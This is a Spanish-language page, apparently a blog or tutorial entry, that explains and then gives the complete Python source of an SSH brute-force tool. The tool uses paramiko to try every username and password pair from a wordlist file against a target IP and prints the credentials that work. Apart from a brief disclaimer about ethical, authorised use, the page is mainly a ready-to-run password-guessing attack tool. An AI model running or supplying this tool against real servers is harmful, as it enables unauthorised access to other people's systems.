# 👹 FUERZA BRUTA A SSH         P4IforceBruteSSH.py

`P4IforceBruteSSH.py`, está diseñado para automatizar la prueba de fuerza bruta en conexiones SSH (Secure Shell). A continuación, un resumen de su funcionalidad:

1. **Banner de Bienvenida:** Muestra un banner de bienvenida al usuario cuando ejecuta el programa.
2. **Colores ANSI:** Define códigos de colores ANSI para mejorar la presentación de la salida en la consola.
3. **Función de Fuerza Bruta (`fuerzabruta`):** Define una función que intenta iniciar sesión en un servidor SSH con un nombre de usuario y contraseña dados. Registra si la prueba fue exitosa o falló y también guarda la actividad en un archivo de registro llamado `registro.log`.
4. **Función Principal (`main`):** Solicita al usuario la dirección IP del objetivo y, de manera predeterminada, el puerto SSH (22). Pregunta si ya tiene un nombre de usuario. Lee listas de nombres de usuario y contraseñas de un archivo llamado `listaUsyPasw.txt`. Realiza pruebas de fuerza bruta para cada combinación de usuario y contraseña llamando a la función `fuerzabruta`.
5. **Manejo de Excepciones (`try`/`except`):** Maneja la interrupción del teclado (Ctrl+C) para finalizar el programa de manera ordenada si el usuario decide detener la ejecución.

En resumen, este script intenta automatizar el proceso de prueba de fuerza bruta en conexiones SSH para un servidor especificado, utilizando nombres de usuario y contraseñas proporcionados en un archivo. Al igual que con el script anterior, ten en cuenta que el uso de herramientas de prueba de fuerza bruta debe realizarse de manera ética y legal, con el permiso del propietario del sistema o la aplicación.

````python
// Some code

```python
#!programa para automatizar la prueba de usuarios y contraseñas a una conexion SSH -  P4IforceBruteSSH.py - By P4IM0N

#-----------------------------------------------------------------------------------------------------------------
import paramiko
from tabulate import tabulate
import time

#-----------------------------------------------------------------------------------------------------------------
# Colores ANSI
COLOR_VERDE = "\033[92m"
COLOR_ROJO = "\033[91m"
COLOR_PURPURA = "\033[95m"
COLOR_RESET = "\033[0m"  # Restablecer el color

#-----------------------------------------------------------------------------------------------------------------
banner= f'''{COLOR_ROJO}

__________  _____ .___  _____                         __________                __           _________ _________ ___ ___  
\______   \/  |  ||   |/ ____\___________   ____  ____\______   \_______ __ ___/  |_  ____  /   _____//   _____//   |   \ 
 |     ___/   |  ||   \   __\/  _ \_  __ \_/ ___\/ __ \|    |  _/\_  __ \  |  \   __\/ __ \ \_____  \ \_____  \/    ~    |
 |    |  /    ^   /   ||  | (  <_> )  | \/\  \__\  ___/|    |   \ |  | \/  |  /|  | \  ___/ /        \/        \    Y    /
 |____|  \____   ||___||__|  \____/|__|    \___  >___  >______  / |__|  |____/ |__|  \___  >_______  /_______  /\___|_  / 
              |__|                             \/    \/       \/                         \/        \/        \/       \/  
{COLOR_RESET}{COLOR_PURPURA}By P4IM0N{COLOR_RESET}'''

print(banner)

#-----------------------------------------------------------------------------------------------------------------
def fuerzabruta(ip,puerto,usuario,contraseña):
    pruebas = []
    log= paramiko.util.log_to_file('registro.log')
    cliente= paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        cliente.connect(ip,port=puerto,username=usuario,password=contraseña)
        pruebas.append([f'CORRECTA: {usuario} : {contraseña}'])
        tabla_prueba = tabulate(pruebas,['PRUEBA'],tablefmt='grid')
        print(COLOR_VERDE+tabla_prueba+COLOR_RESET)
    
    except:
        pruebas.append([f'INCORRECTA: {usuario} : {contraseña}'])
        tabla_prueba = tabulate(pruebas,['PRUEBA'],tablefmt='grid')
        print(COLOR_ROJO+tabla_prueba+COLOR_RESET)    


#-----------------------------------------------------------------------------------------------------------------
def main():
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    ip_objetivo = input('Manito dame la IP objetivo para aplicarle fuerza bruta:  ')
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    puerto = 22
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    existe_usuario = input('Manito tienes un nombre de USUARIO? (s/n):  ')
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    usuarios = open('listaUsyPasw.txt','r')
    usuarios = usuarios.read().split('\n')
    contraseñas = open('listaUsyPasw.txt','r')
    contraseñas = contraseñas.read().split('\n')
    if existe_usuario == 's':
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        usuario_aportado = input('Manito dame el nombre de usuario que tienes para hacer fuerza bruta a su contraseña:  ')
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        for passw in contraseñas:
            time.sleep(3)
            fuerzabruta(ip_objetivo,puerto,usuario_aportado,passw)
    else:     
        for user in usuarios:
            for passw in contraseñas:
                time.sleep(3)
                fuerzabruta(ip_objetivo,puerto,user,passw)
    


#-----------------------------------------------------------------------------------------------------------------
if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        print('Manito hasta la proximaaaa ')
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        exit()    


#-----------------------------------------------------------------------------------------------------------------
```
````
